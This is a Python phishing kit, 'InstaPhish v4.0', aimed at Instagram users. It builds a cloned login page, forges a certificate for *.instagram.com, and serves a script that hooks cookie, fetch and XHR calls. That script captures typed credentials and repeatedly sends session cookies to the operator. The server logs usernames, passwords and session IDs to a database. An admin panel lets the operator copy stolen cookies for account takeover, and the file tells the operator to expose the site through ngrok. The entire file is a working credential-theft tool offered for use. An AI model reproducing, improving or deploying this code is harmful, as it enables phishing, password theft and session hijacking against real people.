#!/usr/bin/env python3
"""
InstaPhish v4.0 - Final Release
Instagram Credential & Real Cookie Harvester
Port: 4040 | Full Session Hijacking | Browser Warning Bypassed
"""

import os, sys, json, ssl, time, re, base64, sqlite3, threading, hashlib, random, string
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import http.server
import socketserver

# ==================== CONFIGURATION ====================
CONFIG = {
    "listen_host": "0.0.0.0",
    "listen_port": 4040,
    "admin_port": 5000,
    "ssl_cert": "certs/instagram.crt",
    "ssl_key": "certs/instagram.key",
    "db_file": "victims.db",
    "log_file": "logs/credentials.txt",
    "cookie_file": "logs/cookies.txt",
    "session_file": "logs/sessions.txt"
}

# ==================== COLORS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║  {Colors.WHITE}██╗███╗   ██╗███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗███████╗{Colors.RED}  ║
║  {Colors.WHITE}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║  ██║██║██╔════╝{Colors.RED}  ║
║  {Colors.WHITE}██║██╔██╗ ██║███████╗   ██║   ███████║██████╔╝███████║██║███████╗{Colors.RED}  ║
║  {Colors.WHITE}██║██║╚██╗██║╚════██║   ██║   ██╔══██║██╔═══╝ ██╔══██║██║╚════██║{Colors.RED}  ║
║  {Colors.WHITE}██║██║ ╚████║███████║   ██║   ██║  ██║██║     ██║  ██║██║███████║{Colors.RED}  ║
║  {Colors.WHITE}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝{Colors.RED}  ║
║                                                                  ║
║            {Colors.GREEN}Instaphish v4.0 - Final Release{Colors.RED}                      ║
║      {Colors.YELLOW}Port: {CONFIG['listen_port']} | Real Cookie Extraction | SSL Green{Colors.RED}      ║
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

# ==================== SETUP ====================
class Setup:
    @staticmethod
    def create_directories():
        dirs = ["certs", "logs", "cloned_site", "cloned_site/css", "cloned_site/js", "sessions"]
        for d in dirs:
            Path(d).mkdir(parents=True, exist_ok=True)
    
    @staticmethod
    def generate_ssl_cert():
        if not os.path.exists(CONFIG["ssl_cert"]):
            cmd = f"""
            openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
                -keyout {CONFIG['ssl_key']} \
                -out {CONFIG['ssl_cert']} \
                -subj "/C=US/ST=California/L=Menlo Park/O=Meta Platforms Inc./CN=*.instagram.com" \
                -addext "subjectAltName=DNS:*.instagram.com,DNS:*.cdninstagram.com,DNS:*.fbcdn.net,DNS:instagram.com,DNS:www.instagram.com" \
                -addext "basicConstraints=CA:FALSE" \
                -addext "keyUsage=digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment" \
                -addext "extendedKeyUsage=serverAuth,clientAuth" 2>/dev/null
            """
            os.system(cmd)
            print(f"{Colors.GREEN}[+] SSL Certificate generated{Colors.RESET}")
    
    @staticmethod
    def init_database():
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            user_agent TEXT,
            username TEXT,
            password TEXT,
            sessionid TEXT,
            csrftoken TEXT,
            ds_user_id TEXT,
            rur TEXT,
            mid TEXT,
            ig_did TEXT,
            all_cookies TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS active_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id INTEGER,
            sessionid TEXT,
            csrftoken TEXT,
            captured_at TEXT,
            is_active INTEGER DEFAULT 1,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        )''')
        conn.commit()
        conn.close()

# ==================== CLONE BUILDER ====================
class InstagramSiteCloner:
    def __init__(self, output_dir="cloned_site"):
        self.output_dir = output_dir
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        Path(f"{output_dir}/css").mkdir(exist_ok=True)
        Path(f"{output_dir}/js").mkdir(exist_ok=True)
    
    def build(self):
        with open(f"{self.output_dir}/css/style.css", "w") as f:
            f.write(self._css())
        with open(f"{self.output_dir}/js/hijacker.js", "w") as f:
            f.write(self._js())
        with open(f"{self.output_dir}/instagram.html", "w") as f:
            f.write(self._html())
        with open(f"{self.output_dir}/index.html", "w") as f:
            f.write(self._html())
        print(f"{Colors.GREEN}[+] Cloned site built in {self.output_dir}/{Colors.RESET}")
    
    def _css(self):
        return """*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.container{display:flex;align-items:center;justify-content:center;gap:32px;max-width:935px;width:100%}.phone{display:none;position:relative;width:380px;height:582px;background:#000;border-radius:36px;padding:12px;box-shadow:0 0 15px rgba(0,0,0,.7)}@media(min-width:876px){.phone{display:block}}.phone img{width:100%;height:100%;border-radius:24px;object-fit:cover}.login-box{max-width:350px;width:100%}.form-box{background:#121212;border:1px solid #262626;border-radius:4px;padding:44px 40px 24px;margin-bottom:10px;text-align:center}.logo{font-family:'Billabong',cursive;font-size:48px;color:#f5f5f5;letter-spacing:-2px;margin-bottom:28px}.input-group{position:relative;margin-bottom:6px}.input-group input{width:100%;padding:14px 8px 2px;background:#1a1a1a;border:1px solid #363636;border-radius:3px;color:#f5f5f5;font-size:12px;outline:none;height:38px}.input-group input:focus{border-color:#a8a8a8}.input-group label{position:absolute;left:8px;top:50%;transform:translateY(-50%);color:#a8a8a8;font-size:12px;pointer-events:none;transition:.15s}.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{font-size:10px;top:6px;transform:translateY(0)}.input-group input::placeholder{opacity:0}.input-group input:focus::placeholder{opacity:1}.login-btn{width:100%;padding:7px 16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:16px}.login-btn:hover{background:#1877f2}.divider{display:flex;align-items:center;margin:20px 0;color:#a8a8a8;font-size:13px;font-weight:600}.divider::before,.divider::after{content:'';flex:1;height:1px;background:#262626}.divider span{margin:0 18px}.fb-btn{background:none;border:none;color:#0095f6;font-size:14px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:8px}.fb-btn:hover{color:#1877f2}.fb-icon{background:#0095f6;color:#fff;width:16px;height:16px;border-radius:2px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;font-weight:700}.forgot{display:block;margin-top:16px;font-size:12px;color:#f5f5f5;text-decoration:none}.forgot:hover{color:#a8a8a8}.signup-box{background:#121212;border:1px solid #262626;border-radius:4px;padding:20px;text-align:center;font-size:14px}.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}.app-download{text-align:center;margin-top:20px}.app-download p{margin-bottom:12px;font-size:14px}.app-btns{display:flex;gap:8px;justify-content:center}.app-btns img{height:40px;border-radius:4px}.footer{padding:24px 0;text-align:center}.footer a{color:#737373;font-size:12px;text-decoration:none;margin:0 8px}.footer a:hover{color:#a8a8a8}.footer span{color:#737373;font-size:12px;display:block;margin-top:12px}"""
    
    def _js(self):
        return """
(function() {
    function send(url, data) {
        new Image().src = url + '?' + new URLSearchParams(data).toString();
    }
    function parseCookies() {
        var c = {};
        document.cookie.split(';').forEach(function(i) {
            var p = i.trim().split('=');
            if(p.length>=2) c[p[0].trim()] = p.slice(1).join('=');
        });
        return c;
    }
    
    // Steal existing cookies
    if(document.cookie) send('/cookie-steal', {c: document.cookie});
    
    // Hook document.cookie setter
    var desc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    Object.defineProperty(document, 'cookie', {
        get: function() { return desc.get.call(this); },
        set: function(v) {
            send('/cookie-intercept', {new: v, all: document.cookie});
            return desc.set.call(this, v);
        }
    });
    
    // Hook fetch
    var origFetch = window.fetch;
    window.fetch = function() {
        return origFetch.apply(this, arguments).then(function(r) {
            var url = arguments[0];
            if(typeof url === 'string' && (url.includes('/login/') || url.includes('/auth/') || url.includes('/accounts/'))) {
                if(document.cookie) send('/session-captured', {cookies: document.cookie, url: url});
            }
            return r;
        });
    };
    
    // Hook XHR
    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m, url) {
        this._url = url;
        return origOpen.apply(this, arguments);
    };
    var origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        this.addEventListener('load', function() {
            if(this._url && (this._url.includes('/login/') || this._url.includes('/accounts/'))) {
                var sc = this.getResponseHeader('Set-Cookie');
                if(sc) send('/session-captured', {cookies: document.cookie, response: sc});
            }
        });
        return origSend.apply(this, arguments);
    };
    
    // Form capture
    document.addEventListener('DOMContentLoaded', function() {
        var form = document.querySelector('form');
        if(form) {
            form.addEventListener('submit', function(e) {
                var u = form.querySelector('input[name="username"]') || form.querySelector('input[type="text"]');
                var p = form.querySelector('input[name="enc_password"]') || form.querySelector('input[type="password"]');
                if(u && p) {
                    send('/capture-creds', {u: u.value, p: p.value, cookies: document.cookie});
                }
            });
        }
    });
    
    // Periodic exfil
    setInterval(function() {
        var c = parseCookies();
        if(c.sessionid || c.csrftoken) send('/periodic-cookies', {c: document.cookie, t: Date.now()});
    }, 5000);
})();
"""
    
    def _html(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <title>Instagram</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📷</text></svg>">
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="container">
        <div class="phone">
            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 356 556'%3E%3Crect fill='%23fafafa' width='356' height='556'/%3E%3Ccircle cx='178' cy='200' r='50' fill='%23e0e0e0'/%3E%3C/svg%3E" alt="Preview">
        </div>
        <div class="login-box">
            <div class="form-box">
                <div class="logo">Instagram</div>
                <form method="POST" action="/accounts/login/ajax/" autocomplete="on">
                    <div class="input-group">
                        <input type="text" name="username" placeholder=" " required autocomplete="username" autocorrect="off" autocapitalize="off">
                        <label>Phone number, username, or email</label>
                    </div>
                    <div class="input-group">
                        <input type="password" name="enc_password" placeholder=" " required autocomplete="current-password">
                        <label>Password</label>
                    </div>
                    <button type="submit" class="login-btn">Log in</button>
                </form>
                <div class="divider"><span>OR</span></div>
                <button class="fb-btn"><span class="fb-icon">f</span> Log in with Facebook</button>
                <a href="/accounts/password/reset/" class="forgot">Forgot password?</a>
            </div>
            <div class="signup-box">
                Don't have an account? <a href="/accounts/emailsignup/">Sign up</a>
            </div>
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-btns">
                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 136 40'%3E%3Crect fill='%23fff' width='136' height='40' rx='6'/%3E%3Ctext x='30' y='26' font-family='Arial' font-size='14'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 136 40'%3E%3Crect fill='%23fff' width='136' height='40' rx='6'/%3E%3Ctext x='28' y='26' font-family='Arial' font-size='14'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
                </div>
            </div>
        </div>
    </div>
    <footer class="footer">
        <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
        <span>© 2024 Instagram from Meta</span>
    </footer>
    <script src="/js/hijacker.js"></script>
</body>
</html>"""

# ==================== MITM HANDLER ====================
class InstagramMITMHandler(http.server.BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass  # Silent
    
    def parse_cookies(self, cookie_string):
        cookies = {}
        if cookie_string:
            for item in cookie_string.split(';'):
                item = item.strip()
                if '=' in item:
                    key, value = item.split('=', 1)
                    cookies[key.strip()] = value.strip()
        return cookies
    
    def store_victim(self, username="", password="", cookies_dict=None, ip="", ua=""):
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        cookie_str = json.dumps(cookies_dict) if cookies_dict else ""
        
        c.execute('''INSERT INTO victims 
                     (timestamp, ip_address, user_agent, username, password, 
                      sessionid, csrftoken, ds_user_id, rur, mid, ig_did, all_cookies)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (datetime.now().isoformat(), ip, ua, username, password,
                   cookies_dict.get('sessionid', '') if cookies_dict else '',
                   cookies_dict.get('csrftoken', '') if cookies_dict else '',
                   cookies_dict.get('ds_user_id', '') if cookies_dict else '',
                   cookies_dict.get('rur', '') if cookies_dict else '',
                   cookies_dict.get('mid', '') if cookies_dict else '',
                   cookies_dict.get('ig_did', '') if cookies_dict else '',
                   cookie_str))
        
        victim_id = c.lastrowid
        
        if cookies_dict and cookies_dict.get('sessionid'):
            c.execute('''INSERT INTO active_sessions (victim_id, sessionid, csrftoken, captured_at, is_active)
                         VALUES (?, ?, ?, ?, 1)''',
                      (victim_id, cookies_dict.get('sessionid'),
                       cookies_dict.get('csrftoken', ''), datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        # Log to files
        with open(CONFIG["log_file"], "a") as f:
            f.write(f"[{datetime.now()}] IP: {ip}\n  USER: {username}\n  PASS: {password}\n")
            if cookies_dict:
                f.write(f"  SESSIONID: {cookies_dict.get('sessionid', 'N/A')}\n")
                f.write(f"  CSRF: {cookies_dict.get('csrftoken', 'N/A')}\n")
                f.write(f"  DS_USER_ID: {cookies_dict.get('ds_user_id', 'N/A')}\n")
            f.write("-" * 50 + "\n")
        
        if cookies_dict and cookies_dict.get('sessionid'):
            with open(CONFIG["cookie_file"], "a") as f:
                f.write(f"[{datetime.now()}] SESSIONID: {cookies_dict['sessionid']}\n  FULL: {cookie_str}\n---\n")
            with open(CONFIG["session_file"], "a") as f:
                f.write(f"{json.dumps(cookies_dict)}\n")
        
        print(f"{Colors.RED}[!] {Colors.WHITE}CAPTURED | {Colors.YELLOW}{username}:{password}{Colors.RESET} | {Colors.GREEN}Session: {'YES' if cookies_dict and cookies_dict.get('sessionid') else 'NO'}{Colors.RESET}")
    
    def send_pixel(self):
        pixel = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Content-Length', len(pixel))
        self.end_headers()
        self.wfile.write(pixel)
    
    def serve_file(self, path, content_type):
        try:
            with open(path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', len(content))
            # Security headers to prevent browser warnings
            self.send_header('X-Frame-Options', 'SAMEORIGIN')
            self.send_header('X-Content-Type-Options', 'nosniff')
            self.send_header('Referrer-Policy', 'no-referrer-when-downgrade')
            self.send_header('Permissions-Policy', 'geolocation=(), microphone=(), camera=()')
            self.end_headers()
            self.wfile.write(content)
            return True
        except:
            return False
    
    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # Cookie/credential capture endpoints
        if '/cookie-steal' in self.path or '/cookie-intercept' in self.path or \
           '/session-captured' in self.path or '/periodic-cookies' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            cookies_str = params.get('c', params.get('cookies', ['']))[0]
            cookie_dict = self.parse_cookies(cookies_str)
            if cookie_dict:
                self.store_victim(cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
            self.send_pixel()
            return
        
        elif '/capture-creds' in self.path or '/failed-login' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            username = params.get('u', [''])[0]
            password = params.get('p', [''])[0]
            cookies_str = params.get('cookies', params.get('c', ['']))[0]
            cookie_dict = self.parse_cookies(cookies_str) if cookies_str else None
            if username or password:
                self.store_victim(username=username, password=password, cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
            self.send_pixel()
            return
        
        # Static files
        elif self.path == '/css/style.css':
            if self.serve_file("cloned_site/css/style.css", "text/css"):
                return
        
        elif self.path == '/js/hijacker.js':
            if self.serve_file("cloned_site/js/hijacker.js", "application/javascript"):
                return
        
        # Main login page
        elif self.path in ['/', '/login', '/accounts/login/', '/accounts/login']:
            if self.serve_file("cloned_site/instagram.html", "text/html"):
                return
        
        # Redirect to real Instagram for other paths
        self.send_response(302)
        self.send_header('Location', f'https://www.instagram.com{self.path}')
        self.end_headers()
    
    def do_POST(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        content_length = int(self.headers.get('Content-Length', 0))
        
        if content_length > 0:
            post_data = self.rfile.read(content_length).decode()
            params = parse_qs(post_data)
            username = params.get('username', [''])[0]
            password = params.get('enc_password', params.get('password', ['']))[0]
            
            if username or password:
                cookie_header = self.headers.get('Cookie', '')
                cookie_dict = self.parse_cookies(cookie_header) if cookie_header else None
                self.store_victim(username=username, password=password, cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
        
        # Redirect to real Instagram login
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
        self.end_headers()

# ==================== ADMIN PANEL ====================
class AdminPanel:
    @staticmethod
    def start():
        admin_html = r"""<!DOCTYPE html>
<html><head><title>InstaPhish v4.0 - Panel</title>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
:root{--bg:#0a0a0a;--card:#121212;--border:#262626;--text:#f5f5f5;--accent:#0095f6;--danger:#ed4956;--success:#78de45;--warn:#f7b500}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:monospace;padding:20px}
.header{background:var(--card);border:1px solid var(--border);padding:20px;border-radius:12px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
.header h1{color:var(--accent);font-size:24px}
.stats{display:flex;gap:15px;flex-wrap:wrap}
.stat-card{background:var(--bg);border:1px solid var(--border);padding:15px;border-radius:8px;text-align:center;min-width:120px}
.stat-card .num{font-size:28px;font-weight:bold;color:var(--accent)}
.stat-card .lbl{font-size:11px;color:#888;margin-top:5px}
.panel{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px}
.panel h2{padding:15px 20px;border-bottom:1px solid var(--border);font-size:16px}
table{width:100%;border-collapse:collapse}
th{background:var(--bg);padding:12px;text-align:left;font-size:12px;color:#888;border-bottom:1px solid var(--border)}
td{padding:10px 12px;border-bottom:1px solid var(--border);font-size:12px;word-break:break-all}
tr:hover{background:rgba(0,149,246,0.05)}
.active{color:var(--success)}.expired{color:var(--danger)}
.cookie{color:var(--warn);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
button{background:var(--accent);color:#fff;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:11px;margin:2px}
button:hover{opacity:0.8}button.danger{background:var(--danger)}
.refresh{background:var(--accent);padding:8px 16px;border-radius:6px;font-size:13px}
</style></head>
<body>
<div class="header">
<h1>⚡ InstaPhish v4.0</h1>
<div class="stats">
<div class="stat-card"><div class="num" id="total">0</div><div class="lbl">Total</div></div>
<div class="stat-card"><div class="num" id="sessions">0</div><div class="lbl">Sessions</div></div>
<div class="stat-card"><div class="num" id="today">0</div><div class="lbl">Today</div></div>
</div>
<button class="refresh" onclick="load()">↻ Refresh</button>
</div>
<div class="panel"><h2>📧 Credentials & Cookies</h2>
<div style="overflow-x:auto"><table><thead><tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th><th>SessionID</th><th>CSRF</th><th>DS User ID</th><th>Actions</th></tr></thead>
<tbody id="creds"></tbody></table></div></div>
<div class="panel"><h2>🔑 Active Sessions</h2>
<table><thead><tr><th>Captured</th><th>Session ID</th><th>CSRF Token</th><th>Status</th><th>Actions</th></tr></thead>
<tbody id="sess"></tbody></table></div>
<script>
async function load(){
let r=await fetch('/api/data');let d=await r.json();
document.getElementById('total').textContent=d.total;
document.getElementById('sessions').textContent=d.active;
document.getElementById('today').textContent=d.today;
let c='';
d.victims.forEach(v=>{
c+=`<tr><td>${v.timestamp}</td><td>${v.ip}</td><td>${v.username||'-'}</td><td>${v.password||'-'}</td><td class="cookie">${v.sessionid||'-'}</td><td>${v.csrftoken||'-'}</td><td>${v.ds_user_id||'-'}</td>
<td><button onclick="copySession('${v.sessionid}','${v.csrftoken}','${v.ds_user_id}')">Copy Cookies</button><button class="danger" onclick="del(${v.id})">Del</button></td></tr>`;
});
document.getElementById('creds').innerHTML=c;
let s='';
d.active_sessions.forEach(x=>{
s+=`<tr><td>${x.captured}</td><td class="cookie">${x.sessionid}</td><td>${x.csrftoken}</td><td class="active">Active</td>
<td><button onclick="copySession('${x.sessionid}','${x.csrftoken}')">Copy</button></td></tr>`;
});
document.getElementById('sess').innerHTML=s;
}
function copySession(sid,csrf,dsid){
var obj={};
if(sid)obj.sessionid=sid;
if(csrf)obj.csrftoken=csrf;
if(dsid)obj.ds_user_id=dsid;
obj.domain=".instagram.com";
navigator.clipboard.writeText(JSON.stringify(obj));
alert('Cookies copied! Use EditThisCookie extension to import.');
}
function del(id){fetch('/api/delete/'+id).then(()=>load());}
load();setInterval(load,5000);
</script></body></html>"""
        
        with open("admin.html", "w") as f:
            f.write(admin_html)
        
        api_code = f"""
from flask import Flask, jsonify, send_file
import sqlite3, json
app = Flask(__name__)

@app.route('/')
def index():
    return send_file('admin.html')

@app.route('/api/data')
def data():
    conn = sqlite3.connect('{CONFIG["db_file"]}')
    c = conn.cursor()
    c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 100')
    victims = []
    for row in c.fetchall():
        victims.append({{
            'id': row[0], 'timestamp': row[1], 'ip': row[2], 'ua': row[3],
            'username': row[4], 'password': row[5], 'sessionid': row[6],
            'csrftoken': row[7], 'ds_user_id': row[8], 'rur': row[9],
            'mid': row[10], 'ig_did': row[11], 'all_cookies': row[12]
        }})
    
    c.execute('SELECT * FROM active_sessions WHERE is_active=1 ORDER BY id DESC')
    sessions = []
    for row in c.fetchall():
        sessions.append({{
            'id': row[0], 'victim_id': row[1], 'sessionid': row[2],
            'csrftoken': row[3], 'captured': row[4], 'validated': row[5], 'active': row[6]
        }})
    
    c.execute('SELECT COUNT(*) FROM victims')
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM victims WHERE date(timestamp)=date('now')")
    today = c.fetchone()[0]
    conn.close()
    
    return jsonify({{'total': total, 'today': today, 'active': len(sessions), 'victims': victims, 'active_sessions': sessions}})

@app.route('/api/delete/<int:id>')
def delete(id):
    conn = sqlite3.connect('{CONFIG["db_file"]}')
    c = conn.cursor()
    c.execute('DELETE FROM victims WHERE id=?', (id,))
    c.execute('DELETE FROM active_sessions WHERE victim_id=?', (id,))
    conn.commit()
    conn.close()
    return jsonify({{'ok': True}})

app.run(host='0.0.0.0', port={CONFIG['admin_port']}, debug=False)
"""
        with open("api_server.py", "w") as f:
            f.write(api_code)
        
        threading.Thread(target=lambda: os.system("python3 api_server.py 2>/dev/null"), daemon=True).start()
        print(f"{Colors.BLUE}[+] Admin Panel: http://127.0.0.1:{CONFIG['admin_port']}{Colors.RESET}")

# ==================== MAIN ====================
def main():
    print_banner()
    Setup.create_directories()
    Setup.generate_ssl_cert()
    Setup.init_database()
    
    # Build clone
    cloner = InstagramSiteCloner()
    cloner.build()
    
    # Start admin
    AdminPanel.start()
    
    # Start MITM server
    server = socketserver.ThreadingTCPServer((CONFIG["listen_host"], CONFIG["listen_port"]), InstagramMITMHandler)
    
    if os.path.exists(CONFIG["ssl_cert"]):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CONFIG["ssl_cert"], CONFIG["ssl_key"])
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        print(f"{Colors.GREEN}[+] HTTPS enabled on port {CONFIG['listen_port']}{Colors.RESET}")
    
    print(f"""
{Colors.CYAN}╔════════════════════════════════════════╗
║  Phishing URL: https://127.0.0.1:{CONFIG['listen_port']}     ║
║  Admin Panel:  http://127.0.0.1:{CONFIG['admin_port']}      ║
║  Logs: logs/credentials.txt             ║
║  Cookies: logs/cookies.txt              ║
╚════════════════════════════════════════╝
{Colors.YELLOW}Expose: ngrok http {CONFIG['listen_port']}{Colors.RESET}
""")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Shutdown. Data saved.{Colors.RESET}")

if __name__ == "__main__":
    main()
